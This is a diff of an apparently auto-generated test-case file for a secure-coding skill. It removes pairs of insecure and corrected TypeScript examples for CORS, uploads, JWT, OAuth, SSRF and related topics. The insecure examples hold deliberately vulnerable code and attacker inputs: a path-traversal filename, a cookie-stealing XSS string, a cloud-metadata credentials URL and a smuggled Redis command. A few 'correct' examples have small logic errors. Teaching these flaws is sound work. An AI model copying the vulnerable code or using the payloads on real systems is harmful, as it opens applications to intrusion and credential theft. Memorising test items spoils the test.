@@ -1,5 +1,5 @@
 {
-  "generated": "2026-06-14T09:22:51.483Z",
+  "generated": "2026-06-14T09:30:57.135Z",
   "skill": "secure-coding-best-practices",
   "total": 50,
   "testCases": [
@@ -16,18 +16,7 @@
         "headers",
         "access-control"
       ],
-      "pairs": [
-        {
-          "incorrect": {
-            "lang": "typescript",
-            "code": "// ❌ Wildcard — any website can call your API cross-origin\napp.use((req, res, next) => {\n  res.header('Access-Control-Allow-Origin', '*')\n  res.header('Access-Control-Allow-Credentials', 'true')  // browsers block this combination\n  next()\n})\n\n// ❌ Reflecting any Origin header — effectively a wildcard\napp.use((req, res, next) => {\n  res.header('Access-Control-Allow-Origin', req.headers.origin)  // dangerous!\n  res.header('Access-Control-Allow-Credentials', 'true')\n  next()\n})\n\n// ❌ Weak origin validation — attacker uses evil.myapp.com\nconst origin = req.headers.origin\nif (origin.includes('myapp.com')) {  // substring match is bypassable\n  res.header('Access-Control-Allow-Origin', origin)\n}"
-          },
-          "correct": {
-            "lang": "typescript",
-            "code": "import cors from 'cors'\n\n// ✅ Explicit origin allowlist — exact string match\nconst ALLOWED_ORIGINS = new Set([\n  'https://app.example.com',\n  'https://www.example.com',\n  process.env.NODE_ENV === 'development' ? 'http://localhost:3000' : null,\n].filter(Boolean) as string[])\n\nconst corsOptions: cors.CorsOptions = {\n  origin: (origin, callback) => {\n    // Allow requests with no origin (curl, mobile apps, Postman)\n    if (!origin) return callback(null, true)\n    if (ALLOWED_ORIGINS.has(origin)) {\n      callback(null, true)\n    } else {\n      callback(new Error(`CORS: origin not allowed: ${origin}`))\n    }\n  },\n  credentials: true,              // required for cookies/auth headers\n  methods: ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'OPTIONS'],\n  allowedHeaders: ['Content-Type', 'Authorization'],\n  maxAge: 86400,                  // cache preflight for 24h\n}\n\napp.use(cors(corsOptions))\n\n// ✅ For public APIs (no credentials), wildcard is safe\nconst publicCors = cors({ origin: '*', credentials: false })\napp.use('/api/public', publicCors)"
-          }
-        }
-      ]
+      "pairs": []
     },
     {
       "skill": "secure-coding-best-practices",
@@ -42,18 +31,7 @@
         "injection",
         "path-traversal"
       ],
-      "pairs": [
-        {
-          "incorrect": {
-            "lang": "typescript",
-            "code": "// ❌ Trusting filename, MIME type, and size from the client\nimport multer from 'multer'\n\nconst upload = multer({\n  dest: 'public/uploads/',  // Stored in publicly accessible directory!\n  // No file size limit\n  // No file type validation\n})\n\napp.post('/api/upload', upload.single('file'), async (req, res) => {\n  const file = req.file!\n  // ❌ Using original filename — path traversal: \"../../../etc/cron.d/backdoor\"\n  const finalPath = `public/uploads/${file.originalname}`\n  await fs.rename(file.path, finalPath)\n\n  // File is now served at https://app.com/uploads/malicious.html\n  // If it contains <script>alert(document.cookie)</script> → stored XSS\n  res.json({ url: `/uploads/${file.originalname}` })\n})"
-          },
-          "correct": {
-            "lang": "typescript",
-            "code": "import multer from 'multer'\nimport { fileTypeFromBuffer } from 'file-type'\nimport crypto from 'crypto'\nimport path from 'path'\n\n// ✅ Strict file size limit\nconst upload = multer({\n  dest: '/tmp/uploads/',                  // Temporary staging — NOT public\n  limits: { fileSize: 5 * 1024 * 1024 },  // 5MB max\n})\n\nconst ALLOWED_TYPES = new Map([\n  ['image/jpeg', '.jpg'],\n  ['image/png', '.png'],\n  ['image/webp', '.webp'],\n  ['application/pdf', '.pdf'],\n])\n\napp.post('/api/upload', upload.single('file'), async (req, res) => {\n  const file = req.file!\n\n  // ✅ Step 1: Validate MIME type by reading magic bytes (not trusting headers)\n  const buffer = await fs.readFile(file.path)\n  const detected = await fileTypeFromBuffer(buffer)\n\n  if (!detected || !ALLOWED_TYPES.has(detected.mime)) {\n    await fs.unlink(file.path)  // Clean up rejected file\n    return res.status(400).json({ error: 'File type not allowed' })\n  }\n\n  // ✅ Step 2: Generate a safe random filename (ignore client filename entirely)\n  const safeFilename = `${crypto.randomUUID()}${ALLOWED_TYPES.get(detected.mime)}`\n\n  // ✅ Step 3: Store outside the webroot — serve via a controller, not static files\n  const storagePath = path.join('/var/app/storage/uploads', safeFilename)\n  await fs.rename(file.path, storagePath)\n\n  // ✅ Step 4: Store metadata in database, serve through an authenticated endpoint\n  const record = await db.uploads.create({\n    id: crypto.randomUUID(),\n    filename: safeFilename,\n    originalName: file.originalname,\n    mimeType: detected.mime,\n    size: file.size,\n    uploadedBy: req.user.id,\n  })\n\n  res.json({ id: record.id, url: `/api/files/${record.id}` })\n})"
-          }
-        }
-      ]
+      "pairs": []
     },
     {
       "skill": "secure-coding-best-practices",
@@ -69,18 +47,7 @@
         "transport-security",
         "http-redirect"
       ],
-      "pairs": [
-        {
-          "incorrect": {
-            "lang": "typescript",
-            "code": "// ❌ No redirect from HTTP to HTTPS\napp.listen(80)  // serves plaintext HTTP\n\n// ❌ No HSTS header — browser may use HTTP first\napp.get('/', (req, res) => {\n  res.send('Hello')  // no HSTS header set\n})"
-          },
-          "correct": {
-            "lang": "typescript",
-            "code": "import helmet from 'helmet'\nimport express from 'express'\n\nconst app = express()\n\n// ✅ Force HTTPS redirect — HTTP → HTTPS\napp.use((req, res, next) => {\n  if (\n    process.env.NODE_ENV === 'production' &&\n    req.headers['x-forwarded-proto'] !== 'https'\n  ) {\n    return res.redirect(301, `https://${req.headers.host}${req.url}`)\n  }\n  next()\n})\n\n// ✅ HSTS — strict transport security with long max-age and subdomains\napp.use(helmet.hsts({\n  maxAge:            365 * 24 * 60 * 60,  // 1 year (recommended: 2 years)\n  includeSubDomains: true,\n  preload:           true,                // submit to HSTS preload list\n}))\n\n// ✅ Full helmet setup (includes HSTS + other security headers)\napp.use(helmet())\n\n// ✅ NGINX config — redirect HTTP and set HSTS\n// server {\n//   listen 80;\n//   return 301 https://$host$request_uri;\n// }\n// server {\n//   listen 443 ssl;\n//   add_header Strict-Transport-Security \"max-age=63072000; includeSubDomains; preload\";\n//   ssl_protocols TLSv1.2 TLSv1.3;\n//   ssl_prefer_server_ciphers off;\n// }"
-          }
-        }
-      ]
+      "pairs": []
     },
     {
       "skill": "secure-coding-best-practices",
@@ -95,18 +62,7 @@
         "duplicate-processing",
         "race-condition"
       ],
-      "pairs": [
-        {
-          "incorrect": {
-            "lang": "typescript",
-            "code": "// ❌ No idempotency — retried requests charge the customer twice\napp.post('/api/payments', async (req, res) => {\n  const { amount, currency, customerId } = req.body\n\n  // If the network drops after charging but before the response reaches the client,\n  // the client retries → customer is charged twice\n  const charge = await stripe.charges.create({\n    amount,\n    currency,\n    customer: customerId,\n  })\n\n  await db.payments.insert({\n    chargeId: charge.id,\n    amount,\n    customerId,\n  })\n\n  res.json({ success: true, chargeId: charge.id })\n})"
-          },
-          "correct": {
-            "lang": "typescript",
-            "code": "// ✅ Idempotency key prevents duplicate processing\napp.post('/api/payments', async (req, res) => {\n  const idempotencyKey = req.headers['idempotency-key'] as string\n\n  if (!idempotencyKey) {\n    return res.status(400).json({ error: 'Idempotency-Key header is required' })\n  }\n\n  // Check if this key was already processed\n  const existing = await db.idempotencyKeys.findOne({\n    key: idempotencyKey,\n    endpoint: '/api/payments',\n  })\n\n  if (existing) {\n    // Return the cached response — no side effects executed\n    return res.status(existing.statusCode).json(existing.responseBody)\n  }\n\n  // Process the request (first time with this key)\n  const { amount, currency, customerId } = req.body\n  const charge = await stripe.charges.create({\n    amount,\n    currency,\n    customer: customerId,\n    idempotencyKey,  // Stripe also supports idempotency natively\n  })\n\n  const response = { success: true, chargeId: charge.id }\n\n  // Cache the response for this idempotency key (TTL: 24 hours)\n  await db.idempotencyKeys.insert({\n    key: idempotencyKey,\n    endpoint: '/api/payments',\n    statusCode: 200,\n    responseBody: response,\n    expiresAt: new Date(Date.now() + 24 * 60 * 60 * 1000),\n  })\n\n  res.json(response)\n})"
-          }
-        }
-      ]
+      "pairs": []
     },
     {
       "skill": "secure-coding-best-practices",
@@ -121,18 +77,7 @@
         "brute-force",
         "dos"
       ],
-      "pairs": [
-        {
-          "incorrect": {
-            "lang": "typescript",
-            "code": "// ❌ No limit — attacker can try millions of passwords\napp.post('/auth/login', async (req, res) => {\n  const user = await verifyCredentials(req.body.email, req.body.password)\n  if (!user) return res.status(401).json({ error: 'Invalid credentials' })\n  res.json({ token: issueToken(user) })\n})\n\n// ❌ Password reset — attacker enumerates valid emails at will\napp.post('/auth/forgot-password', async (req, res) => {\n  await sendResetEmail(req.body.email)\n  res.json({ success: true })\n})"
-          },
-          "correct": {
-            "lang": "typescript",
-            "code": "import rateLimit from 'express-rate-limit'\nimport RedisStore from 'rate-limit-redis'\nimport { createClient } from 'redis'\n\nconst redis = createClient({ url: process.env.REDIS_URL })\nawait redis.connect()\n\n// ✅ Strict limit for auth endpoints — per IP\nconst authLimiter = rateLimit({\n  windowMs: 15 * 60 * 1000,  // 15 minutes\n  max: 10,                    // 10 attempts per 15 min per IP\n  standardHeaders: true,\n  legacyHeaders: false,\n  store: new RedisStore({ sendCommand: (...args) => redis.sendCommand(args) }),\n  message: { error: 'Too many login attempts, try again in 15 minutes' },\n})\n\n// ✅ General API limit — per authenticated user\nconst apiLimiter = rateLimit({\n  windowMs: 60 * 1000,       // 1 minute\n  max: 100,                  // 100 requests/min per IP\n  keyGenerator: (req) => req.user?.id || req.ip,  // per-user when authenticated\n  store: new RedisStore({ sendCommand: (...args) => redis.sendCommand(args) }),\n})\n\n// ✅ Apply tiered limits\napp.post('/auth/login',            authLimiter, loginHandler)\napp.post('/auth/forgot-password',  authLimiter, forgotPasswordHandler)\napp.post('/auth/register',         authLimiter, registerHandler)\napp.use('/api',                    apiLimiter)\n\n// ✅ Account lockout after N failed attempts (complement to rate limiting)\nasync function trackFailedLogin(userId: string) {\n  const key = `failed_logins:${userId}`\n  const attempts = await redis.incr(key)\n  await redis.expire(key, 15 * 60)  // 15 min window\n  if (attempts >= 5) {\n    await db.users.update({ where: { id: userId }, data: { lockedUntil: new Date(Date.now() + 15 * 60 * 1000) } })\n  }\n}"
-          }
-        }
-      ]
+      "pairs": []
     },
     {
       "skill": "secure-coding-best-practices",
@@ -148,18 +93,7 @@
         "openapi",
         "request-validation"
       ],
-      "pairs": [
-        {
-          "incorrect": {
-            "lang": "typescript",
-            "code": "// ❌ No validation — attacker sends { isAdmin: true, price: -100 }\napp.post('/api/products', requireAuth, async (req, res) => {\n  const product = await db.products.create({ data: req.body })  // mass assignment!\n  res.json(product)\n})\n\n// ❌ No query param validation — type coercion issues\napp.get('/api/search', async (req, res) => {\n  const { q, limit } = req.query\n  const results = await db.products.findMany({ where: { name: { contains: q } }, take: limit })\n})"
-          },
-          "correct": {
-            "lang": "typescript",
-            "code": "import { z } from 'zod'\nimport { Request, Response, NextFunction } from 'express'\n\n// ✅ Middleware factory for schema validation\nfunction validateBody<T>(schema: z.ZodSchema<T>) {\n  return (req: Request, res: Response, next: NextFunction) => {\n    const result = schema.safeParse(req.body)\n    if (!result.success) {\n      return res.status(400).json({\n        error: 'Validation failed',\n        details: result.error.flatten(),\n      })\n    }\n    req.body = result.data  // replace with validated + typed data\n    next()\n  }\n}\n\nfunction validateQuery<T>(schema: z.ZodSchema<T>) {\n  return (req: Request, res: Response, next: NextFunction) => {\n    const result = schema.safeParse(req.query)\n    if (!result.success) {\n      return res.status(400).json({ error: 'Invalid query', details: result.error.flatten() })\n    }\n    req.query = result.data as any\n    next()\n  }\n}\n\n// ✅ Strict schema — only allowed fields pass through (no mass assignment)\nconst CreateProductSchema = z.object({\n  name:        z.string().min(1).max(200),\n  description: z.string().max(2000).optional(),\n  price:       z.number().positive().max(1_000_000),\n  categoryId:  z.string().uuid(),\n  // isAdmin, internalId, etc. are NOT in the schema — stripped automatically\n})\n\nconst SearchSchema = z.object({\n  q:      z.string().max(100).optional(),\n  limit:  z.coerce.number().int().min(1).max(100).default(20),\n  offset: z.coerce.number().int().min(0).default(0),\n})\n\napp.post('/api/products',\n  requireAuth,\n  requireRole('seller'),\n  validateBody(CreateProductSchema),\n  async (req, res) => {\n    const product = await db.products.create({\n      data: { ...req.body, sellerId: req.user.id }  // ✅ sellerId from session, not body\n    })\n    res.json(product)\n  }\n)\n\napp.get('/api/search', validateQuery(SearchSchema), async (req, res) => {\n  const { q, limit, offset } = req.query as z.infer<typeof SearchSchema>\n  const results = await db.products.findMany({\n    where: q ? { name: { contains: q, mode: 'insensitive' } } : {},\n    take: limit,\n    skip: offset,\n  })\n  res.json(results)\n})"
-          }
-        }
-      ]
+      "pairs": []
     },
     {
       "skill": "secure-coding-best-practices",
@@ -174,18 +108,7 @@
         "signature",
         "algorithm"
       ],
-      "pairs": [
-        {
-          "incorrect": {
-            "lang": "typescript",
-            "code": "// ❌ Only decodes — does NOT verify signature\nimport jwt from 'jsonwebtoken'\nconst payload = jwt.decode(token) // trusts token blindly\n\n// ❌ Accepts 'none' algorithm — attacker can forge any payload\nconst payload = jwt.verify(token, secret) // if alg not locked down\n\n// ❌ No expiry, issuer, or audience check\nconst payload = jwt.verify(token, secret, {})"
-          },
-          "correct": {
-            "lang": "typescript",
-            "code": "import jwt from 'jsonwebtoken'\n\nconst JWT_SECRET  = process.env.JWT_SECRET!\nconst JWT_ISSUER  = 'https://auth.example.com'\nconst JWT_AUDIENCE = 'https://api.example.com'\n\nfunction verifyToken(token: string): JwtPayload {\n  // ✅ Allowlist algorithm — rejects 'none' and RS256/HS256 confusion\n  const payload = jwt.verify(token, JWT_SECRET, {\n    algorithms: ['HS256'],   // explicit allowlist only\n    issuer:    JWT_ISSUER,\n    audience:  JWT_AUDIENCE,\n    // exp is checked automatically by jsonwebtoken\n  })\n  return payload as JwtPayload\n}\n\n// ✅ Use on every protected route\napp.get('/api/resource', (req, res) => {\n  const token = req.headers.authorization?.replace('Bearer ', '')\n  if (!token) return res.status(401).json({ error: 'Unauthorized' })\n  try {\n    const payload = verifyToken(token)\n    req.user = payload\n    next()\n  } catch {\n    return res.status(401).json({ error: 'Invalid token' })\n  }\n})"
-          }
-        }
-      ]
+      "pairs": []
     },
     {
       "skill": "secure-coding-best-practices",
@@ -200,18 +123,7 @@
         "2fa",
         "privileged-access"
       ],
-      "pairs": [
-        {
-          "incorrect": {
-            "lang": "typescript",
-            "code": "// ❌ Admin action gated only by JWT role — no second factor\napp.post('/api/admin/users/:id/delete', requireRole('admin'), async (req, res) => {\n  await db.users.delete({ where: { id: req.params.id } })\n  res.json({ success: true })\n})"
-          },
-          "correct": {
-            "lang": "typescript",
-            "code": "import speakeasy from 'speakeasy'\nimport QRCode from 'qrcode'\n\n// ✅ Enroll MFA — generate TOTP secret\napp.post('/api/mfa/enroll', requireAuth, async (req, res) => {\n  const secret = speakeasy.generateSecret({ name: `MyApp (${req.user.email})` })\n  await db.users.update({\n    where: { id: req.user.id },\n    data: { mfaSecret: encrypt(secret.base32), mfaEnabled: false },\n  })\n  const qr = await QRCode.toDataURL(secret.otpauth_url!)\n  res.json({ qr, secret: secret.base32 })\n})\n\n// ✅ Confirm enrollment\napp.post('/api/mfa/confirm', requireAuth, async (req, res) => {\n  const { token } = req.body\n  const user = await db.users.findById(req.user.id)\n  const verified = speakeasy.totp.verify({\n    secret: decrypt(user.mfaSecret),\n    encoding: 'base32',\n    token,\n    window: 1,\n  })\n  if (!verified) return res.status(400).json({ error: 'Invalid MFA code' })\n  await db.users.update({ where: { id: user.id }, data: { mfaEnabled: true } })\n  res.json({ success: true })\n})\n\n// ✅ Step-up middleware for sensitive endpoints\nfunction requireMfaVerified(req: Request, res: Response, next: NextFunction) {\n  if (!req.user.mfaVerifiedAt) {\n    return res.status(403).json({ error: 'MFA verification required', code: 'MFA_REQUIRED' })\n  }\n  const tenMinutesAgo = Date.now() - 10 * 60 * 1000\n  if (req.user.mfaVerifiedAt < tenMinutesAgo) {\n    return res.status(403).json({ error: 'MFA session expired', code: 'MFA_EXPIRED' })\n  }\n  next()\n}\n\napp.post('/api/admin/users/:id/delete',\n  requireAuth,\n  requireRole('admin'),\n  requireMfaVerified,  // ✅ requires recent MFA verification\n  async (req, res) => {\n    await db.users.delete({ where: { id: req.params.id } })\n    res.json({ success: true })\n  }\n)"
-          }
-        }
-      ]
+      "pairs": []
     },
     {
       "skill": "secure-coding-best-practices",
@@ -227,18 +139,7 @@
         "csrf",
         "redirect"
       ],
-      "pairs": [
-        {
-          "incorrect": {
-            "lang": "typescript",
-            "code": "// ❌ No state parameter — CSRF attack can link attacker account to victim\nconst authUrl = `https://provider.com/oauth/authorize\n  ?client_id=${CLIENT_ID}\n  &redirect_uri=${REDIRECT_URI}\n  &response_type=code`\nres.redirect(authUrl)\n\n// ❌ Callback accepts any code without verifying state\napp.get('/callback', async (req, res) => {\n  const { code } = req.query\n  const tokens = await exchangeCode(code) // no state check!\n})"
-          },
-          "correct": {
-            "lang": "typescript",
-            "code": "import crypto from 'crypto'\n\n// ✅ Generate and store state + PKCE verifier\napp.get('/auth/login', (req, res) => {\n  const state         = crypto.randomBytes(32).toString('hex')\n  const codeVerifier  = crypto.randomBytes(64).toString('base64url')\n  const codeChallenge = crypto\n    .createHash('sha256')\n    .update(codeVerifier)\n    .digest('base64url')\n\n  // Store in server-side session (not cookie directly)\n  req.session.oauthState        = state\n  req.session.oauthCodeVerifier = codeVerifier\n\n  const authUrl = new URL('https://provider.com/oauth/authorize')\n  authUrl.searchParams.set('client_id',             CLIENT_ID)\n  authUrl.searchParams.set('redirect_uri',          REDIRECT_URI)\n  authUrl.searchParams.set('response_type',         'code')\n  authUrl.searchParams.set('state',                 state)\n  authUrl.searchParams.set('code_challenge',        codeChallenge)\n  authUrl.searchParams.set('code_challenge_method', 'S256')\n  res.redirect(authUrl.toString())\n})\n\n// ✅ Verify state before exchanging code\napp.get('/callback', async (req, res) => {\n  const { code, state } = req.query\n  if (state !== req.session.oauthState) {\n    return res.status(403).json({ error: 'Invalid state — possible CSRF' })\n  }\n  const tokens = await exchangeCode(code, req.session.oauthCodeVerifier)\n  delete req.session.oauthState\n  delete req.session.oauthCodeVerifier\n  // proceed with tokens\n})"
-          }
-        }
-      ]
+      "pairs": []
     },
     {
       "skill": "secure-coding-best-practices",
@@ -253,18 +154,7 @@
         "bcrypt",
         "argon2"
       ],
-      "pairs": [
-        {
-          "incorrect": {
-            "lang": "typescript",
-            "code": "// ❌ Storing plaintext password\nawait db.users.create({ email, password: plaintext })\n\n// ❌ Fast hash — cracks at ~10 billion/sec on modern GPU\nimport { createHash } from 'crypto'\nconst hash = createHash('sha256').update(password).digest('hex')\nawait db.users.create({ email, password: hash })"
-          },
-          "correct": {
-            "lang": "typescript",
-            "code": "import argon2 from 'argon2'\n\n// ✅ Hash on registration\nconst hash = await argon2.hash(password, {\n  type: argon2.argon2id,\n  memoryCost: 65536,  // 64 MB\n  timeCost: 3,\n  parallelism: 4,\n})\nawait db.users.create({ email, passwordHash: hash })\n\n// ✅ Verify on login\nconst isValid = await argon2.verify(user.passwordHash, password)\nif (!isValid) throw new AuthError('Invalid credentials')\n\n// ✅ Alternative: bcrypt (cost factor >= 12)\nimport bcrypt from 'bcrypt'\nconst hash = await bcrypt.hash(password, 12)\nconst isValid = await bcrypt.compare(password, user.passwordHash)"
-          }
-        }
-      ]
+      "pairs": []
     },
     {
       "skill": "secure-coding-best-practices",
@@ -278,18 +168,7 @@
         "access-control",
         "middleware"
       ],
-      "pairs": [
-        {
-          "incorrect": {
-            "lang": "typescript",
-            "code": "// ❌ Only the frontend hides the admin button — no server check\napp.delete('/api/users/:id', async (req, res) => {\n  await db.users.delete({ where: { id: req.params.id } })\n  res.json({ success: true })\n})\n\n// ❌ Trusting a role from the client request body\napp.post('/api/report', async (req, res) => {\n  if (req.body.role === 'admin') {  // attacker controls this!\n    return sendFullReport(res)\n  }\n})\n\n// ❌ IDOR — user can access any user's data by changing the ID\napp.get('/api/profile/:userId', async (req, res) => {\n  const user = await db.users.findById(req.params.userId)\n  res.json(user)\n})"
-          },
-          "correct": {
-            "lang": "typescript",
-            "code": "// ✅ Reusable role-check middleware\nfunction requireRole(...roles: Role[]) {\n  return (req: Request, res: Response, next: NextFunction) => {\n    if (!req.user) return res.status(401).json({ error: 'Unauthenticated' })\n    if (!roles.includes(req.user.role)) {\n      return res.status(403).json({ error: 'Forbidden' })\n    }\n    next()\n  }\n}\n\n// ✅ Admin-only route — checked server-side\napp.delete('/api/users/:id', requireAuth, requireRole('admin'), async (req, res) => {\n  await db.users.delete({ where: { id: req.params.id } })\n  res.json({ success: true })\n})\n\n// ✅ Ownership check — user can only access their own data\napp.get('/api/profile/:userId', requireAuth, async (req, res) => {\n  if (req.params.userId !== req.user.id && req.user.role !== 'admin') {\n    return res.status(403).json({ error: 'Forbidden' })\n  }\n  const user = await db.users.findById(req.params.userId)\n  res.json(user)\n})"
-          }
-        }
-      ]
+      "pairs": []
     },
     {
       "skill": "secure-coding-best-practices",
@@ -304,18 +183,7 @@
         "xss",
         "csrf"
       ],
-      "pairs": [
-        {
-          "incorrect": {
-            "lang": "typescript",
-            "code": "// ❌ Cookie readable by JavaScript — XSS can steal session\nres.cookie('sessionId', token)\n\n// ❌ No Secure flag — sent over HTTP\nres.cookie('sessionId', token, { httpOnly: true })\n\n// ❌ No SameSite — CSRF vulnerable\nres.cookie('sessionId', token, { httpOnly: true, secure: true })"
-          },
-          "correct": {
-            "lang": "typescript",
-            "code": "// ✅ Full session cookie security\nres.cookie('sessionId', token, {\n  httpOnly: true,            // not accessible via document.cookie\n  secure: true,              // only sent over HTTPS\n  sameSite: 'strict',        // blocks CSRF entirely for same-origin\n  maxAge: 15 * 60 * 1000,   // 15 minutes; use 'session' for browser-session cookies\n  path: '/',\n})\n\n// ✅ For cross-site APIs (e.g., embedded widgets), use 'none' + secure\nres.cookie('sessionId', token, {\n  httpOnly: true,\n  secure: true,\n  sameSite: 'none',          // required for cross-site; must be secure: true\n  maxAge: 15 * 60 * 1000,\n})\n\n// ✅ Express session library example\napp.use(session({\n  secret: process.env.SESSION_SECRET!,\n  resave: false,\n  saveUninitialized: false,\n  cookie: {\n    httpOnly: true,\n    secure: process.env.NODE_ENV === 'production',\n    sameSite: 'strict',\n    maxAge: 15 * 60 * 1000,\n  },\n}))"
-          }
-        }
-      ]
+      "pairs": []
     },
     {
       "skill": "secure-coding-best-practices",
@@ -329,18 +197,7 @@
         "url-validation",
         "access-control"
       ],
-      "pairs": [
-        {
-          "incorrect": {
-            "lang": "typescript",
-            "code": "// ❌ Fetches any URL the user provides — including internal services\napp.post('/api/preview', async (req, res) => {\n  const { url } = req.body\n\n  // Attacker sends: url = \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\"\n  // → Server fetches AWS IAM credentials and returns them to the attacker\n\n  // Attacker sends: url = \"http://10.0.0.5:6379/CONFIG+SET+dir+/var/www/html\"\n  // → Server sends commands to internal Redis\n\n  const response = await fetch(url)\n  const html = await response.text()\n  res.json({ preview: html })\n})\n\n// ❌ DNS rebinding bypasses hostname checks\n// Attacker's DNS returns 1.2.3.4 on first lookup (passes validation)\n// then 169.254.169.254 on second lookup (actual fetch hits metadata API)"
-          },
-          "correct": {
-            "lang": "typescript",
-            "code": "import { URL } from 'url'\nimport dns from 'dns/promises'\nimport ipaddr from 'ipaddr.js'\n\n// ✅ Allowlist of permitted domains\nconst ALLOWED_HOSTS = new Set(['api.example.com', 'cdn.example.com', 'images.example.com'])\n\n// ✅ Block private/internal IP ranges\nfunction isPrivateIP(ip: string): boolean {\n  try {\n    const addr = ipaddr.parse(ip)\n    const range = addr.range()\n    return ['private', 'loopback', 'linkLocal', 'uniqueLocal', 'unspecified'].includes(range)\n  } catch {\n    return true  // Block unparseable addresses\n  }\n}\n\napp.post('/api/preview', async (req, res) => {\n  const { url: userUrl } = req.body\n\n  // Step 1: Parse and validate URL scheme\n  const parsed = new URL(userUrl)\n  if (!['https:'].includes(parsed.protocol)) {\n    return res.status(400).json({ error: 'Only HTTPS URLs are allowed' })\n  }\n\n  // Step 2: Check hostname against allowlist\n  if (!ALLOWED_HOSTS.has(parsed.hostname)) {\n    return res.status(400).json({ error: 'Domain not in allowlist' })\n  }\n\n  // Step 3: Resolve DNS and check for private IPs (prevents DNS rebinding)\n  const addresses = await dns.resolve4(parsed.hostname)\n  if (addresses.some(isPrivateIP)) {\n    return res.status(400).json({ error: 'Blocked: target resolves to private IP' })\n  }\n\n  // Step 4: Fetch with redirect disabled (prevents redirect to internal URLs)\n  const response = await fetch(userUrl, { redirect: 'error' })\n  const html = await response.text()\n  res.json({ preview: html.substring(0, 10000) })  // Limit response size\n})"
-          }
-        }
-      ]
+      "pairs": []
     },
     {
       "skill": "secure-coding-best-practices",
@@ -355,18 +212,7 @@
         "refresh-tokens",
         "expiry"
       ],
-      "pairs": [
-        {
-          "incorrect": {
-            "lang": "typescript",
-            "code": "// ❌ Token valid for 30 days — stolen token compromises account for weeks\nconst token = jwt.sign({ userId: user.id }, JWT_SECRET, {\n  expiresIn: '30d',\n})\nres.json({ token })\n\n// ❌ Refresh tokens never invalidated — reuse undetected\napp.post('/auth/refresh', async (req, res) => {\n  const { refreshToken } = req.body\n  const payload = jwt.verify(refreshToken, REFRESH_SECRET)\n  const newAccessToken = jwt.sign({ userId: payload.userId }, JWT_SECRET, { expiresIn: '1h' })\n  res.json({ accessToken: newAccessToken })\n  // ❌ old refreshToken still works!\n})"
-          },
-          "correct": {
-            "lang": "typescript",
-            "code": "// ✅ Access token: 15 minutes\nfunction issueAccessToken(userId: string) {\n  return jwt.sign({ userId }, JWT_SECRET, { expiresIn: '15m' })\n}\n\n// ✅ Refresh token: stored in DB, single-use with rotation\nasync function issueRefreshToken(userId: string) {\n  const token = crypto.randomBytes(64).toString('hex')\n  await db.refreshTokens.create({\n    token: await hash(token),   // store hash only\n    userId,\n    expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000), // 7 days\n  })\n  return token\n}\n\n// ✅ Rotate on use — invalidate old, issue new\napp.post('/auth/refresh', async (req, res) => {\n  const { refreshToken } = req.body\n  const tokenHash = await hash(refreshToken)\n  const stored = await db.refreshTokens.findOne({ token: tokenHash })\n\n  if (!stored || stored.expiresAt < new Date()) {\n    // If already used — possible theft, revoke all user tokens\n    if (!stored) await db.refreshTokens.deleteMany({ userId: stored?.userId })\n    return res.status(401).json({ error: 'Invalid refresh token' })\n  }\n\n  // Invalidate old token, issue new pair\n  await db.refreshTokens.delete({ id: stored.id })\n  const newAccess  = issueAccessToken(stored.userId)\n  const newRefresh = await issueRefreshToken(stored.userId)\n  res.json({ accessToken: newAccess, refreshToken: newRefresh })\n})"
-          }
-        }
-      ]
+      "pairs": []
     },
     {
       "skill": "secure-coding-best-practices",
@@ -382,18 +228,7 @@
         "database",
         "pii"
       ],
-      "pairs": [
-        {
-          "incorrect": {
-            "lang": "typescript",
-            "code": "// ❌ SSN, card number, health data stored in plaintext\nawait db.patients.create({\n  data: {\n    name:          req.body.name,\n    ssn:           req.body.ssn,           // plaintext — breach exposes millions of SSNs\n    healthRecord:  req.body.healthRecord,\n    cardNumber:    req.body.cardNumber,\n  }\n})"
-          },
-          "correct": {
-            "lang": "typescript",
-            "code": "import { createCipheriv, createDecipheriv, randomBytes } from 'crypto'\n\nconst ENCRYPTION_KEY = Buffer.from(process.env.FIELD_ENCRYPTION_KEY!, 'hex')  // 32-byte key\nconst ALGORITHM = 'aes-256-gcm'\n\n// ✅ Encrypt a field value\nfunction encryptField(plaintext: string): string {\n  const iv  = randomBytes(12)                        // 96-bit IV for GCM\n  const cipher = createCipheriv(ALGORITHM, ENCRYPTION_KEY, iv)\n  const encrypted = Buffer.concat([cipher.update(plaintext, 'utf8'), cipher.final()])\n  const tag = cipher.getAuthTag()                    // authentication tag (16 bytes)\n  // Store: iv + tag + ciphertext, base64-encoded\n  return Buffer.concat([iv, tag, encrypted]).toString('base64')\n}\n\n// ✅ Decrypt a field value\nfunction decryptField(encoded: string): string {\n  const buf  = Buffer.from(encoded, 'base64')\n  const iv   = buf.subarray(0, 12)\n  const tag  = buf.subarray(12, 28)\n  const data = buf.subarray(28)\n  const decipher = createDecipheriv(ALGORITHM, ENCRYPTION_KEY, iv)\n  decipher.setAuthTag(tag)\n  return Buffer.concat([decipher.update(data), decipher.final()]).toString('utf8')\n}\n\n// ✅ Encrypt before storing, decrypt after fetching\nawait db.patients.create({\n  data: {\n    name:         req.body.name,\n    ssnEncrypted: encryptField(req.body.ssn),\n    healthRecord: encryptField(req.body.healthRecord),\n    // cardNumber: DO NOT store — use Stripe/payment vault instead\n  }\n})\n\nconst patient = await db.patients.findById(id)\nconst ssn = decryptField(patient.ssnEncrypted)"
-          }
-        }
-      ]
+      "pairs": []
     },
     {
       "skill": "secure-coding-best-practices",
@@ -408,18 +243,7 @@
         "data-minimization",
         "pii"
       ],
-      "pairs": [
-        {
-          "incorrect": {
-            "lang": "typescript",
-            "code": "// ❌ Collecting far more than needed for a newsletter signup\nconst UserSchema = z.object({\n  email:       z.string().email(),\n  firstName:   z.string(),\n  lastName:    z.string(),\n  dateOfBirth: z.string(),   // not needed for newsletter\n  phone:       z.string(),   // not needed for newsletter\n  address:     z.string(),   // not needed for newsletter\n  ssn:         z.string(),   // definitely not needed\n})\n\n// ❌ Storing full API responses that contain unneeded PII\nconst githubUser = await fetchGithubUser(token)\nawait db.users.create({ data: githubUser })  // stores all 50+ GitHub fields"
-          },
-          "correct": {
-            "lang": "typescript",
